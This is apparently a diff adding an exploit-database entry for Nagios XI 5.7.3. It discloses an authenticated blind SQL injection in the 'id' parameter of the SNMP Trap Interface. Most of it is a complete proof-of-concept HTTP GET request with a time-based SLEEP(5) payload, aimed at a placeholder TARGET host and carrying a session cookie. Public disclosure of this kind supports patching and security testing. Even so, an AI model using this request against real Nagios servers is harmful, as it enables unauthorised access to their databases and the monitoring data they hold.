@@ -1,0 +1,27 @@
+# Exploit Title: Nagios XI 5.7.3 - 'SNMP Trap Interface' Authenticated SQL Injection
+# Date: 10-18-2020
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://www.nagios.com/products/nagios-xi/
+# Vendor Changelog: https://www.nagios.com/downloads/nagios-xi/change-log/
+# Software Link: https://www.nagios.com/downloads/nagios-xi/
+# Version: Nagios XI 5.7.3
+# Tested on: Ubuntu 18.04
+
+
+# Vulnerability Details
+# Description : A blind SQL injection vulnerability exists in the "Add a Trap Definition" functionality of the SNMP Trap Interface of Nagios XI.
+# Vulnerable Parameter : id
+
+
+# POC
+
+GET /nagiosxi/includes/components/nxti/index.php?event=test&oid=123&category=test&severity=test&desc=%3C%3E&format=&id=&SNMPTW%5Bhost%5D=&SNMPTW%5Bservice%5D=&SNMPTW%5Bseverity%5D=%24s&SNMPTW%5Boutput%5D=&exec%5B%5D=&raw-data=&mode=save&new=0&tab=3&id=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a) HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://TARGET/nagiosxi/includes/components/nxti/index.php
+Cookie: nagiosxi=a354rem56a8aoeieqr9k2le39i
